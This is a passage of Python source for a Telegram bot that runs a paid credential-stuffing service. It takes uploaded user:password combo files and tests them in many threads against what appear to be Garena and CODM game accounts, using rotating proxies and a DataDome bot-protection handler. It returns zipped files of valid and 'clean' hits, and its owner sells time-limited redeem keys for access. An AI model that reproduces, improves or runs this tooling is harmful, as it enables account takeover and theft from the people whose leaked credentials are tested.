                f"Max allowed: <b>{MAX_CONCURRENT_USERS}</b>\n\n"
                f"Please wait a few minutes and try again.")
            with _state_lock:
                _bot_state[chat_id] = "AWAIT_FILE"
            with _stop_events_lock:
                _stop_events.pop(chat_id, None)
            _cleanup_files()
            return
        try:
            d     = _udata(chat_id)
            uname = d.get("username", "")
            label = f"@{uname}" if uname else f"id:{chat_id}"
            stats, result_folder = _run_checker_for_file(
                clean_path, user_telegram_config,
                chat_id=chat_id, label=label,
                stop_event=stop_evt
            )
            _rf[0] = result_folder   # store in shared container for _cleanup_files
            stopped = stop_evt.is_set()
        except MemoryError:
            stats    = {}
            _rf[0]   = ""
            gc.collect()
            logger.error(f"[BOT] MemoryError during check — forcing GC")
            try:
                _tg_send(token, chat_id, "⚠️ <b>Out of memory!</b> Try again with a smaller file.")
            except Exception:
                pass
        except Exception as e:
            stats    = {}
            _rf[0]   = ""
            logger.error(f"[BOT] Checker error: {e}", exc_info=True)
        finally:
            with _state_lock:
                _bot_state[chat_id] = "AWAIT_FILE"
            with _stop_events_lock:
                _stop_events.pop(chat_id, None)

            if stopped:
                _tg_send(token, chat_id,
                    "🛑 <b>Checker stopped by user.</b>\n\n"
                    f"📊 <b>Partial results for</b> <code>{file_name}</code>\n"
                    f"✅ Valid: <code>{stats.get('valid',0)}</code>  "
                    f"❌ Invalid: <code>{stats.get('invalid',0)}</code>\n"
                    f"🧹 Clean: <code>{stats.get('clean',0)}</code>  "
                    f"⚠️ Not Clean: <code>{stats.get('not_clean',0)}</code>"
                )
            else:
                valid      = stats.get("valid", 0)
                invalid    = stats.get("invalid", 0)
                clean_c    = stats.get("clean", 0)
                not_clean  = stats.get("not_clean", 0)
                has_codm   = stats.get("has_codm", 0)
                total_done = stats.get("total", 0)

                _tg_send(token, chat_id,
                    f"✅ <b>Checker Finished!</b>\n\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"📊 <b>Final Results for</b> <code>{file_name}</code>\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"✅ <b>Valid:</b>      <code>{valid}</code>\n"
                    f"❌ <b>Invalid:</b>    <code>{invalid}</code>\n"
                    f"🧹 <b>Clean:</b>     <code>{clean_c}</code>\n"
                    f"⚠️ <b>Not Clean:</b> <code>{not_clean}</code>\n"
                    f"🎮 <b>Has CODM:</b>  <code>{has_codm}</code>\n"
                    f"📦 <b>Total:</b>     <code>{total_done}</code>"
                )

            # ── Send zip FIRST, then delete everything ─────────
            if _rf[0] and os.path.isdir(_rf[0]):
                _send_results_zip(token, chat_id, _rf[0], file_name)
            elif not stopped:
                _tg_send(token, chat_id,
                    "📭 <b>No result files</b> — no valid hits found.")

            # ── Delete combo files + result folder ──────────────
            _cleanup_files()

            # Force GC after each check run to free memory on Railway
            gc.collect()

            _tg_send(token, chat_id,
                f"📂 Send your next combo file to check again.\n"
                f"<i>garena.txt · codm.txt · Yuki_garena.txt etc.</i>\n"
                f"Or /start to reset your settings.")
    threading.Thread(target=_run, daemon=True).start()


# ── zip result folder and send to user ────────────────────────
def _send_results_zip(token: str, chat_id, result_folder: str, original_name: str):
    """Collect all non-empty .txt files in result_folder, zip them, send to user."""
    import zipfile, io

    # Collect non-empty txt files (walk subdirs too for level folders)
    files_to_zip = []
    for root, dirs, files in os.walk(result_folder):
        for fname in files:
            fpath = os.path.join(root, fname)
            if os.path.getsize(fpath) > 0:
                files_to_zip.append(fpath)

    if not files_to_zip:
        _tg_send(token, chat_id,
            "📭 <b>No result files to send</b> — no valid hits were found.")
        return

    # Build zip in memory
    zip_buffer = io.BytesIO()
    with zipfile.ZipFile(zip_buffer, "w", zipfile.ZIP_DEFLATED) as zf:
        for fpath in files_to_zip:
            # Preserve subfolder structure inside zip
            arcname = os.path.relpath(fpath, os.path.dirname(result_folder))
            zf.write(fpath, arcname)
    zip_buffer.seek(0)

    # Name: results_<chat_id>_<date>_<time>.zip
    ts       = time.strftime("%Y%m%d_%H%M%S")
    zip_name = f"results_{chat_id}_{ts}.zip"

    try:
        url = f"https://api.telegram.org/bot{token}/sendDocument"
        requests.post(
            url,
            data={
                "chat_id":    chat_id,
                "caption":    f"📦 <b>Your result files</b> — enjoy! 🎯",
                "parse_mode": "HTML",
            },
            files={"document": (zip_name, zip_buffer, "application/zip")},
            timeout=60,
        )
    except Exception as e:
        logger.warning(f"[BOT] sendDocument zip error: {e}")
        _tg_send(token, chat_id, "❌ Failed to send zip file. Please try again.")


# ── send a single file as Telegram document ───────────────────
def _send_document(token: str, chat_id, filepath: str, caption: str = ""):
    """Upload a local file to a Telegram chat as a document."""
    if not os.path.exists(filepath) or os.path.getsize(filepath) == 0:
        return
    try:
        url = f"https://api.telegram.org/bot{token}/sendDocument"
        with open(filepath, "rb") as f:
            requests.post(
                url,
                data={"chat_id": chat_id, "caption": caption, "parse_mode": "HTML"},
                files={"document": (os.path.basename(filepath), f, "text/plain")},
                timeout=15,
            )
    except Exception as e:
        logger.warning(f"[BOT] sendDocument error: {e}")
# Global registry so multiple users' bars show simultaneously
_active_bars : dict = {}   # chat_id -> { label, done, total, speed, start_time }
_bars_lock           = threading.Lock()
_prev_bar_count      = [0]   # how many lines we drew last frame


def _render_bars():
    """
    Single background thread — redraws all active progress bars in-place.
    Style matches Image 2:  id:XXXXXXXXX [████░░░░░░░] 32.3%  97/300  1/s
    One line per user. Nothing else prints to terminal in BOT_MODE.
    """
    import sys

    BAR_LEN = 30          # bar width in chars

    # ANSI colours
    CYAN   = "\033[1;96m"
    GREEN  = "\033[1;92m"
    YELLOW = "\033[1;93m"
    WHITE  = "\033[1;37m"
    DIM    = "\033[2m"
    RESET  = "\033[0m"

    while True:
        time.sleep(0.1)
        with _bars_lock:
            bars = list(_active_bars.items())

        if not bars:
            _prev_bar_count[0] = 0
            continue

        lines = []
        for cid, b in bars:
            done  = b["done"]
            total = b["total"]
            speed = b["speed"]
            pct   = done / total if total else 0
            filled = int(BAR_LEN * pct)
            bar    = "█" * filled + "░" * (BAR_LEN - filled)

            line = (
                f"  {CYAN}id:{cid}{RESET} "
                f"[{GREEN}{bar}{RESET}] "
                f"{YELLOW}{pct*100:>5.1f}%{RESET}  "
                f"{WHITE}{done}/{total}{RESET}  "
                f"{DIM}{speed}/s{RESET}"
            )
            lines.append(line)

        prev = _prev_bar_count[0]
        out  = ""

        if prev > 0:
            out += f"\033[{prev}A"   # move cursor up to overwrite previous bars

        for line in lines:
            out += f"\033[2K{line}\n"

        # Clear any leftover lines from a previous larger count
        for _ in range(max(0, prev - len(lines))):
            out += "\033[2K\n"

        sys.stdout.write(out)
        sys.stdout.flush()
        _prev_bar_count[0] = len(lines)


# Start the renderer once (daemon — dies with the main process)
threading.Thread(target=_render_bars, daemon=True).start()


class _BotLogFilter(logging.Filter):
    """In BOT_MODE: drop ALL log output — progress bar is the only terminal output.
    Nothing from processaccount, prelogin, login, proxy rotation etc. should print."""
    def filter(self, record):
        if BOT_MODE:
            return False   # drop everything — progress bar handles display
        return True


# Attach the filter to every handler on the root logger
def _apply_bot_log_filter():
    f = _BotLogFilter()
    root = logging.getLogger()
    for handler in root.handlers:
        handler.addFilter(f)
    root.addFilter(f)

_apply_bot_log_filter()


def _run_checker_for_file(filepath: str, telegram_config: tuple, chat_id=None, label: str = "user", stop_event=None) -> tuple:
    """Returns (stats_dict, result_folder_path)"""
    if not os.path.exists(filepath):
        logger.error(f"[BOT] File not found: {filepath}")
        return {}, ""

    base          = os.path.splitext(os.path.basename(filepath))[0]
    result_folder = f"{base}_results"
    os.makedirs(result_folder, exist_ok=True)

    accounts = []
    for enc in ["utf-8", "latin-1", "cp1252", "iso-8859-1"]:
        try:
            with open(filepath, "r", encoding=enc, errors="ignore") as fh:
                accounts = [l.strip() for l in fh
                            if l.strip() and ":" in l and not l.startswith("===")]
            break
        except UnicodeDecodeError:
            continue
        except Exception:
            break

    if not accounts:
        logger.error("[BOT] No valid accounts in file.")
        return {}, result_folder

    total            = len(accounts)
    MAX_THREADS      = MAX_THREADS_PER_USER   # use global setting
    cookie_manager   = CookieManager()
    live_stats       = LiveStats()
    live_stats.start_tracking(total)
    print_lock       = threading.Lock()
    thread_local     = threading.local()
    thread_init_lock = threading.Lock()

    # ── Register progress bar entry ────────────────────────────
    bar_key = chat_id or label
    start_t = time.time()
    with _bars_lock:
        _active_bars[bar_key] = {
            "label": label,
            "done":  0,
            "total": total,
            "speed": 0,
            "start_time": start_t,
            "live_stats": live_stats,
        }

    done_count = [0]

    # ── Telegram live progress updater ─────────────────────────
    _progress_msg_id = [None]   # mutable container for message_id
    _progress_stop   = threading.Event()

    def _tg_progress_updater():
        """Background thread: sends/edits a fancy progress message every 10s."""
        tg_token = telegram_config[0] if telegram_config else None
        tg_chat  = chat_id
        if not tg_token or not tg_chat:
            return
        last_text = ""
        while not _progress_stop.is_set():
            _progress_stop.wait(10)
            if _progress_stop.is_set():
                break
            try:
                fancy = live_stats.get_fancy_telegram_progress()
                if not fancy or fancy == last_text:
                    continue
                last_text = fancy
                if _progress_msg_id[0]:
                    _tg_api(tg_token, "editMessageText",
                            chat_id=tg_chat, message_id=_progress_msg_id[0],
                            text=fancy)
                else:
                    resp = _tg_api(tg_token, "sendMessage",
                                   chat_id=tg_chat, text=fancy)
                    if resp and resp.get("ok"):
                        _progress_msg_id[0] = resp["result"]["message_id"]
            except Exception:
                pass

    progress_thread = threading.Thread(target=_tg_progress_updater, daemon=True)
    progress_thread.start()

    def get_session():
        if not hasattr(thread_local, "session"):
            # Stagger startups without holding a lock
            time.sleep(0.01)
            dm = DataDomeManager()
            thread_local.session = create_thread_session(cookie_manager, dm)
            thread_local.dm      = dm
            thread_local.session.proxies.update(geo_rotator.get_proxies())
        else:
            thread_local.session.proxies.update(geo_rotator.get_proxies())
        return thread_local.session, thread_local.dm

    def process_one(idx_line):
        i, line = idx_line
        if ":" not in line:
            return
        # Check both user stop and global shutdown
        if stop_event and stop_event.is_set():
            return
        if shutdown_event.is_set():
            return
        # ── Acquire global slot — blocks if VPS is at capacity ──
        _global_thread_sem.acquire()
        try:
            if stop_event and stop_event.is_set(): return
            if shutdown_event.is_set(): return
            user, pwd = line.split(":", 1)
            sess, dm  = get_session()
            # no delay — maximum speed
            processaccount(sess, user.strip(), pwd.strip(),
                           cookie_manager, dm, live_stats,
                           result_folder, telegram_config=telegram_config)
        except Exception:
            pass
        finally:
            _global_thread_sem.release()
            with _bars_lock:
                if bar_key in _active_bars:
                    done_count[0] += 1
                    elapsed = max(time.time() - start_t, 0.001)
                    speed   = int(done_count[0] / elapsed)
                    _active_bars[bar_key]["done"]  = done_count[0]
                    _active_bars[bar_key]["speed"] = speed

    with ThreadPoolExecutor(max_workers=MAX_THREADS) as ex:
        for fut in as_completed(
            {ex.submit(process_one, item): item
             for item in enumerate(accounts, 1)}
        ):
            try:
                fut.result()
            except Exception:
                pass

    # ── Stop the progress updater ──────────────────────────────
    _progress_stop.set()
    progress_thread.join(timeout=3)

    # ── Send final progress snapshot ───────────────────────────
    try:
        tg_token = telegram_config[0] if telegram_config else None
        if tg_token and chat_id:
            final_fancy = live_stats.get_fancy_telegram_progress()
            if final_fancy:
                final_text = final_fancy.replace("⚡️ Checking…", "✅ Checking Complete!")
                if _progress_msg_id[0]:
                    _tg_api(tg_token, "editMessageText",
                            chat_id=chat_id, message_id=_progress_msg_id[0],
                            text=final_text)
                else:
                    _tg_api(tg_token, "sendMessage",
                            chat_id=chat_id, text=final_text)
    except Exception:
        pass

    # ── Close all thread sessions to free connections + memory ──
    if hasattr(thread_local, "session"):
        try:
            thread_local.session.close()
        except Exception:
            pass

    # Force GC to free memory after checker run
    gc.collect()

    # ── Remove bar + print done line so terminal stays clean ──
    with _bars_lock:
        _active_bars.pop(bar_key, None)

    # Give renderer one tick to clear, then print a clean done line
    time.sleep(0.15)
    CYAN  = "\033[1;96m"
    GREEN = "\033[1;92m"
    WHITE = "\033[1;37m"
    DIM   = "\033[2m"
    RESET = "\033[0m"
    import sys
    bar_key_str = str(chat_id) if chat_id else label
    sys.stdout.write(
        f"\033[2K  {CYAN}id:{bar_key_str}{RESET} "
        f"[{GREEN}{'█' * 30}{RESET}] "
        f"{GREEN}100.0%{RESET}  "
        f"{WHITE}{total}/{total}{RESET}  "
        f"{DIM}done ✓{RESET}\n"
    )
    sys.stdout.flush()

    return live_stats.get_stats(), result_folder


# ══════════════════════════════════════════════════════════════
#  OWNER CONFIG  — set your username and Telegram ID here
# ══════════════════════════════════════════════════════════════
# Owner credentials — pulled from config.json (set by setup wizard)
OWNER_ID       = _cfg.get("owner_id", 0)
OWNER_USERNAME = _cfg.get("owner_username", "").lower()
COOWNER_IDS    = set(_cfg.get("coowner_ids", []))   # set of int IDs

def _is_owner(from_user: dict) -> bool:
    uid   = from_user.get("id", 0)
    uname = from_user.get("username", "").lower().lstrip("@")
    return uid == OWNER_ID or uid in COOWNER_IDS or (OWNER_USERNAME and uname == OWNER_USERNAME)

def _is_primary_owner(from_user: dict) -> bool:
    """Only the primary owner can add/remove co-owners."""
    uid = from_user.get("id", 0)
    return uid == OWNER_ID

def _add_coowner(uid: int):
    """Add a co-owner ID and persist to config."""
    COOWNER_IDS.add(uid)
    _cfg["coowner_ids"] = list(COOWNER_IDS)
    with open(CONFIG_FILE, "w", encoding="utf-8") as f:
        json.dump(_cfg, f, indent=2)

def _remove_coowner(uid: int):
    """Remove a co-owner ID and persist to config."""
    COOWNER_IDS.discard(uid)
    _cfg["coowner_ids"] = list(COOWNER_IDS)
    with open(CONFIG_FILE, "w", encoding="utf-8") as f:
        json.dump(_cfg, f, indent=2)


def _is_vip_user(chat_id) -> bool:
    """Check if user has a valid (non-expired) redeem key — VIP users get no combo limit."""
    d = _udata(chat_id)
    key         = d.get("key")
    key_expires = d.get("key_expires", 0)
    if key and time.time() < key_expires:
        return True
    # Check saved profile
    saved = _get_saved_profile(str(chat_id))
    if saved and saved.get("key") and time.time() < saved.get("key_expires", 0):
        return True
    return False


# ══════════════════════════════════════════════════════════════
#  REDEEM KEY SYSTEM
# ══════════════════════════════════════════════════════════════
KEYS_FILE = "redeem_keys.json"

def _load_keys() -> dict:
    if os.path.exists(KEYS_FILE):
        try:
            with open(KEYS_FILE, "r", encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            pass
    return {}

def _save_keys(keys: dict):
    with open(KEYS_FILE, "w", encoding="utf-8") as f:
        json.dump(keys, f, indent=2)

def _gen_key() -> str:
    return uuid.uuid4().hex[:20].upper()

# ── /generate_key interactive state ────────────────────────────
# Stores partial genkey wizard data per owner chat_id
_genkey_wizard: dict = {}  # chat_id -> {"step": "AWAIT_DURATION"|"AWAIT_USERS"|"AWAIT_LIMIT"|"AWAIT_COUNT", "duration": int, "max_users": int, "combo_limit": int}


def _parse_duration(arg: str) -> int:
    """Parse e.g. '1hrs' / '2h' / '30min' / '1d' → seconds. Returns 0 on failure."""
    arg = arg.strip().lower()
    import re
    m = re.match(r"(\d+)\s*(hr?s?|min?s?|d)", arg)
    if not m:
        return 0
    val, unit = int(m.group(1)), m.group(2)
    if unit.startswith("d"):   return val * 86400
    if unit.startswith("h"):   return val * 3600
    if unit.startswith("m"):   return val * 60
    return 0


def _dur_label(seconds: int) -> str:
    days = seconds // 86400
    hrs  = (seconds % 86400) // 3600
    mins = (seconds % 3600) // 60
    parts = []
    if days: parts.append(f"{days}d")
    if hrs:  parts.append(f"{hrs}h")
    if mins: parts.append(f"{mins}m")
    return " ".join(parts) if parts else "0m"


# ── /generate_key [duration] ───────────────────────────────────
def _handle_gen_key(token: str, chat_id, from_user: dict, args: str):
    if not _is_owner(from_user):
        _tg_send(token, chat_id, "🚫 <b>Owner only command.</b>")
        return

    args = args.strip()

    if not args:
        # ── Interactive wizard: ask duration first ─────────────
        _genkey_wizard[chat_id] = {"step": "AWAIT_DURATION"}
        _tg_send_buttons(token, chat_id,
            "🔑 <b>Generate Key — Step 1 of 2</b>\n\n"
            "⏳ How long should the key be valid?\n\n"
            "<i>Tap a button or type a custom duration (e.g. <code>3d</code>, <code>12hrs</code>, <code>45min</code>)</i>",
            [
                [
                    {"text": "1 Hour",  "callback_data": "gk_dur:3600"},
                    {"text": "6 Hours", "callback_data": "gk_dur:21600"},
                    {"text": "12 Hours","callback_data": "gk_dur:43200"},
                ],
                [
                    {"text": "1 Day",   "callback_data": "gk_dur:86400"},
                    {"text": "3 Days",  "callback_data": "gk_dur:259200"},
                    {"text": "7 Days",  "callback_data": "gk_dur:604800"},
                ],
                [
                    {"text": "30 Days", "callback_data": "gk_dur:2592000"},
                    {"text": "❌ Cancel","callback_data": "gk_cancel"},
                ],
            ]
        )
        return

    # ── One-shot: /generate_key 1d ─────────────────────────────
    duration = _parse_duration(args)
    if duration <= 0:
        _tg_send(token, chat_id,
            "❌ <b>Invalid duration.</b>\n\n"
            "Usage: /generate_key 1d\n"
            "Examples: 1hrs  30min  7d")
        return

    # Start from users step (duration already known)
    _genkey_wizard[chat_id] = {"step": "AWAIT_USERS", "duration": duration}
    _ask_genkey_users(token, chat_id, duration)


def _ask_genkey_users(token: str, chat_id, duration: int):
    """Ask owner how many users/devices can redeem this key (Step 2 of 4)."""
    _tg_send_buttons(token, chat_id,
        f"🔑 <b>Generate Key — Step 2 of 4</b>\n\n"
        f"⏳ Duration: <b>{_dur_label(duration)}</b>\n\n"
        f"👥 How many users/devices can use this key?\n\n"
        f"<i>Tap a button or type a custom number (e.g. <code>50</code>)</i>",
        [
            [
                {"text": "1 user",    "callback_data": "gk_usr:1"},
                {"text": "5 users",   "callback_data": "gk_usr:5"},
                {"text": "10 users",  "callback_data": "gk_usr:10"},
            ],
            [
                {"text": "25 users",  "callback_data": "gk_usr:25"},
                {"text": "50 users",  "callback_data": "gk_usr:50"},
                {"text": "100 users", "callback_data": "gk_usr:100"},
            ],
            [
                {"text": "∞ Unlimited users", "callback_data": "gk_usr:0"},
                {"text": "❌ Cancel",          "callback_data": "gk_cancel"},
            ],
        ]
    )


def _ask_genkey_limit(token: str, chat_id, duration: int, max_users: int):
    """Ask owner to pick combo line limit for the new key(s) (Step 3 of 4)."""
    users_disp = "∞ Unlimited" if max_users == 0 else f"{max_users}"
    _tg_send_buttons(token, chat_id,
        f"🔑 <b>Generate Key — Step 3 of 4</b>\n\n"
        f"⏳ Duration: <b>{_dur_label(duration)}</b>\n"
        f"👥 Users: <b>{users_disp}</b>\n\n"
        f"📦 How many combo lines should each user be allowed?\n\n"
        f"<i>Tap a button or type a custom number (e.g. <code>2000</code>)</i>",
        [
            [
                {"text": "500 lines",  "callback_data": "gk_lim:500"},
                {"text": "1000 lines", "callback_data": "gk_lim:1000"},
            ],
            [
                {"text": "2500 lines", "callback_data": "gk_lim:2500"},
                {"text": "5000 lines", "callback_data": "gk_lim:5000"},
            ],
            [
                {"text": "∞ Unlimited","callback_data": "gk_lim:0"},
                {"text": "❌ Cancel",  "callback_data": "gk_cancel"},
            ],
        ]
    )


def _ask_genkey_count(token: str, chat_id, duration: int, max_users: int, combo_limit: int):
    """Ask owner how many keys to generate (Step 4 of 4)."""
    limit_disp = "∞ Unlimited" if combo_limit == 0 else f"{combo_limit:,} lines"
    users_disp = "∞ Unlimited" if max_users == 0 else f"{max_users}"
    _tg_send_buttons(token, chat_id,
        f"🔑 <b>Generate Key — Step 4 of 4</b>\n\n"
        f"⏳ Duration: <b>{_dur_label(duration)}</b>\n"
        f"👥 Users/key: <b>{users_disp}</b>\n"
        f"📦 Limit/user: <b>{limit_disp}</b>\n\n"
        f"🔢 How many keys do you want to generate?\n\n"
        f"<i>Tap a button or type a custom number (e.g. <code>50</code>)</i>",
        [
            [
                {"text": "1 key",    "callback_data": "gk_cnt:1"},
                {"text": "5 keys",   "callback_data": "gk_cnt:5"},
                {"text": "10 keys",  "callback_data": "gk_cnt:10"},
            ],
            [
                {"text": "25 keys",  "callback_data": "gk_cnt:25"},
                {"text": "50 keys",  "callback_data": "gk_cnt:50"},
                {"text": "100 keys", "callback_data": "gk_cnt:100"},
            ],
            [
                {"text": "❌ Cancel", "callback_data": "gk_cancel"},
            ],
        ]
    )


def _finalize_gen_key(token: str, chat_id, duration: int, combo_limit: int, count: int = 1, max_users: int = 1):
    """Actually create `count` keys, each allowing up to `max_users` users."""
    now     = time.time()
    expires = now + duration
    keys    = _load_keys()

    new_keys = []
    for _ in range(count):
        k = _gen_key()
        keys[k] = {
            "expires":     expires,
            "combo_limit": combo_limit,
            "max_users":   max_users,   # 0 = unlimited
            "used_by":     [],          # list of chat_ids that redeemed
            "created":     now,
        }
        new_keys.append(k)

    _save_keys(keys)
    _genkey_wizard.pop(chat_id, None)

    limit_disp = "∞ Unlimited" if combo_limit == 0 else f"{combo_limit:,} lines"
    users_disp = "∞ Unlimited" if max_users  == 0 else f"{max_users}"
    exp_dt     = datetime.fromtimestamp(expires).strftime("%Y-%m-%d %H:%M")

    if count == 1:
        _tg_send(token, chat_id,
            f"✅ <b>Key Generated Successfully!</b>\n\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🔑 <b>Key:</b>\n<code>{new_keys[0]}</code>\n\n"
            f"⏳ <b>Duration:</b> {_dur_label(duration)}\n"
            f"📅 <b>Expires:</b> {exp_dt}\n"
            f"👥 <b>Users/devices:</b> {users_disp}\n"
            f"📦 <b>Combo limit/user:</b> {limit_disp}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"<i>Share this key — up to {users_disp} users can redeem it.</i>"
        )
    else:
        import io
        txt_content = "\n".join(new_keys) + "\n"
        txt_bytes   = txt_content.encode("utf-8")
        ts          = time.strftime("%Y%m%d_%H%M%S")
        fname       = f"keys_{count}_{ts}.txt"

        _tg_send(token, chat_id,
            f"✅ <b>{count} Keys Generated!</b>\n\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"⏳ <b>Duration:</b> {_dur_label(duration)}\n"
            f"📅 <b>Expires:</b> {exp_dt}\n"
            f"👥 <b>Users/devices per key:</b> {users_disp}\n"
            f"📦 <b>Combo limit/user:</b> {limit_disp}\n"
            f"🔢 <b>Total keys:</b> {count}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"<i>Keys attached below as .txt file.</i>"
        )
        try:
            url = f"https://api.telegram.org/bot{token}/sendDocument"
            requests.post(
                url,
                data={
                    "chat_id":    chat_id,
                    "caption":    f"🔑 <b>{count} keys</b> · {_dur_label(duration)} · {users_disp} users · {limit_disp}",
                    "parse_mode": "HTML",
                },
                files={"document": (fname, io.BytesIO(txt_bytes), "text/plain")},
                timeout=15,
            )
        except Exception as e:
            logger.warning(f"[BOT] Key file send failed: {e}")
            chunk_size = 20
            for i in range(0, len(new_keys), chunk_size):
                chunk = new_keys[i:i + chunk_size]
                _tg_send(token, chat_id,
                    f"🔑 <b>Keys {i+1}–{i+len(chunk)}:</b>\n\n" +
                    "\n".join(f"<code>{k}</code>" for k in chunk)
                )


def _handle_server_status(token: str, chat_id, from_user: dict):
    """Show live server resource usage to the owner."""
    if not _is_owner(from_user):
        _tg_send(token, chat_id, "🚫 <b>Owner only command.</b>")
        return

    try:
        import psutil
        cpu    = psutil.cpu_percent(interval=1)
        mem    = psutil.virtual_memory()
        disk   = psutil.disk_usage('/')
        mem_mb = mem.used // (1024 * 1024)
        mem_total_mb = mem.total // (1024 * 1024)
        disk_gb = disk.used / (1024**3)
        disk_total_gb = disk.total / (1024**3)
        sys_info = (
            f"🖥 <b>CPU:</b> {cpu:.1f}%\n"
            f"🧠 <b>RAM:</b> {mem_mb}MB / {mem_total_mb}MB ({mem.percent:.1f}%)\n"
            f"💾 <b>Disk:</b> {disk_gb:.1f}GB / {disk_total_gb:.1f}GB ({disk.percent:.1f}%)\n"
        )
    except ImportError:
        sys_info = "<i>Install psutil for CPU/RAM stats: pip install psutil</i>\n"

    running_users  = [cid for cid, s in _bot_state.items() if s == "RUNNING"]
    total_users    = len(_saved_users)
    sem_available  = _global_thread_sem._value  # available slots

    _tg_send(token, chat_id,
        f"📊 <b>Server Status</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"{sys_info}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🤖 <b>Bot Stats</b>\n"
        f"  👥 Registered users: <b>{total_users}</b>\n"
        f"  🏃 Running checkers: <b>{len(running_users)}</b> / {MAX_CONCURRENT_USERS}\n"
        f"  🧵 Thread slots free: <b>{sem_available}</b> / {MAX_GLOBAL_THREADS}\n"
        f"  📡 Proxy pool: <b>{geo_rotator.total}</b>\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"⚙️ <b>Limits</b>\n"
        f"  Max concurrent users: <b>{MAX_CONCURRENT_USERS}</b>\n"
        f"  Threads per user: <b>{MAX_THREADS_PER_USER}</b>\n"
        f"  Total thread cap: <b>{MAX_GLOBAL_THREADS}</b>"
    )


# ── /statuskey ─────────────────────────────────────────────────
def _handle_status_key(token: str, chat_id, from_user: dict, args: str):
    if not _is_owner(from_user):
        _tg_send(token, chat_id, "🚫 <b>Owner only command.</b>")
        return

    keys = _load_keys()
    if not keys:
        _tg_send(token, chat_id, "📭 <b>No keys found.</b>\nGenerate one with /generate_key")
        return

    now = time.time()
    # If a specific key was passed, show details for just that one
    target = args.strip().upper() if args.strip() else None

    if target:
        if target not in keys:
            _tg_send(token, chat_id, f"❌ Key <code>{target}</code> not found.")
            return
        e = keys[target]
        expired   = now > e.get("expires", 0)
        remaining = max(0, int(e.get("expires", 0) - now))
        status    = "❌ Expired" if expired else f"✅ Active — {_dur_label(remaining)} left"
        # Handle both legacy (string) and new (list) used_by
        used_by   = e.get("used_by", [])
        if isinstance(used_by, str):
            used_by = [used_by] if used_by else []
        max_users  = e.get("max_users", 1)
        slots_used = len(used_by)
        slots_max  = "∞" if max_users == 0 else str(max_users)
        limit_disp = "∞ Unlimited" if e.get("combo_limit") == 0 else f"{e.get('combo_limit', 500):,}"
        created    = datetime.fromtimestamp(e.get("created", 0)).strftime("%Y-%m-%d %H:%M")
        exp_dt     = datetime.fromtimestamp(e.get("expires", 0)).strftime("%Y-%m-%d %H:%M")
        users_list = "\n".join(f"    • <code>{u}</code>" for u in used_by) or "    <i>none yet</i>"
        _tg_send(token, chat_id,
            f"🔍 <b>Key Details</b>\n\n"
            f"🔑 <code>{target}</code>\n\n"
            f"📊 <b>Status:</b> {status}\n"
            f"📅 <b>Created:</b> {created}\n"
            f"📅 <b>Expires:</b> {exp_dt}\n"
            f"👥 <b>Slots:</b> {slots_used}/{slots_max} used\n"
            f"📦 <b>Limit/user:</b> {limit_disp} lines\n"
            f"👤 <b>Users redeemed:</b>\n{users_list}"
        )
        return

    # Show summary of all keys
    total   = len(keys)
    active  = [k for k, v in keys.items() if now < v.get("expires", 0)]
    expired = [k for k, v in keys.items() if now >= v.get("expires", 0)]

    def _used_count(v):
        ub = v.get("used_by", [])
        if isinstance(ub, str): return 1 if ub else 0
        return len(ub)

    unused  = [k for k, v in keys.items() if _used_count(v) == 0]

    lines = [
        f"📋 <b>Key Status Overview</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🔢 <b>Total:</b> {total}  |  ✅ Active: {len(active)}  |  ❌ Expired: {len(expired)}\n"
        f"🆓 <b>Unused:</b> {len(unused)}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
    ]

    if active:
        lines.append("✅ <b>Active Keys:</b>")
        for k in active[:10]:
            v = keys[k]
            rem        = max(0, int(v.get("expires", 0) - now))
            used_cnt   = _used_count(v)
            max_u      = v.get("max_users", 1)
            slots      = f"{used_cnt}/{'∞' if max_u == 0 else max_u}"
            lim        = "∞" if v.get("combo_limit") == 0 else str(v.get("combo_limit", 500))
            lines.append(f"  <code>{k}</code>\n  ⏳ {_dur_label(rem)} · 👥 {slots} · 📦 {lim}")
        if len(active) > 10:
            lines.append(f"  <i>...and {len(active)-10} more</i>")

    if expired:
        lines.append("\n❌ <b>Expired Keys:</b>")
        for k in expired[:5]:
            v        = keys[k]
            used_cnt = _used_count(v)
            max_u    = v.get("max_users", 1)
            slots    = f"{used_cnt}/{'∞' if max_u == 0 else max_u}"
            lines.append(f"  <code>{k}</code> — 👥 {slots}")
        if len(expired) > 5:
            lines.append(f"  <i>...and {len(expired)-5} more</i>")

    lines.append(f"\n<i>Use /deletekey to remove keys</i>")
    _tg_send(token, chat_id, "\n".join(lines))


# ── /deletekey — interactive inline key picker ─────────────────
def _build_deletekey_keyboard(keys: dict, selected: set, now: float) -> list:
    rows = []
    sorted_keys = sorted(
        keys.items(),
        key=lambda kv: (kv[1].get("expires", 0) > now, kv[1].get("expires", 0))
    )

    for k, v in sorted_keys[:20]:
        expired   = now >= v.get("expires", 0)
        remaining = max(0, int(v.get("expires", 0) - now))
        used_by   = v.get("used_by", [])
        if isinstance(used_by, str):
            used_by = [used_by] if used_by else []
        max_u     = v.get("max_users", 1)
        slots     = f"{len(used_by)}/{'∞' if max_u == 0 else max_u}"
        status    = "❌" if expired else f"⏳{_dur_label(remaining)}"
        tick      = "✅ " if k in selected else ""
        label     = f"{tick}{k[:8]}… {status} 👥{slots}"
        rows.append([{"text": label, "callback_data": f"dk_toggle:{k}"}])

    if len(keys) > 20:
        rows.append([{"text": f"⚠️ Showing 20/{len(keys)} keys", "callback_data": "dk_noop"}])

    rows.append([
        {"text": "☑️ All Expired",  "callback_data": "dk_sel:expired"},
        {"text": "☑️ All Unused",   "callback_data": "dk_sel:unused"},
        {"text": "☑️ Select All",   "callback_data": "dk_sel:all"},
    ])

    sel_count    = len(selected)
